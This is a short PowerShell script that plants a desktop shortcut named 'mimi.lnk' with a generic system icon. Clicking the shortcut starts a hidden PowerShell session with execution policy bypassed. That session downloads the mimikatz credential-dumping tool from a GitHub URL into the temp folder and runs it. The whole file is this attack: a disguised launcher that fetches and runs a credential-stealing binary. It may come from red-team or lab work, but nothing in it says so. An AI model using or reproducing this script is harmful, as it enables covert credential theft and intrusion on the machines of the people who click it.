$Desktop = [Environment]::GetFolderPath("Desktop")
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Desktop\mimi.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest https://raw.githubusercontent.com/ParrotSec/mimikatz/6375ee772e3c69a788eb6fe24e457390e06702bf/x64/mimikatz.exe -OutFile $env:TEMP\mimi.exe; Start-Process $env:TEMP\mimi.exe"'
$Shortcut.IconLocation = "shell32.dll,13"
$Shortcut.Save()
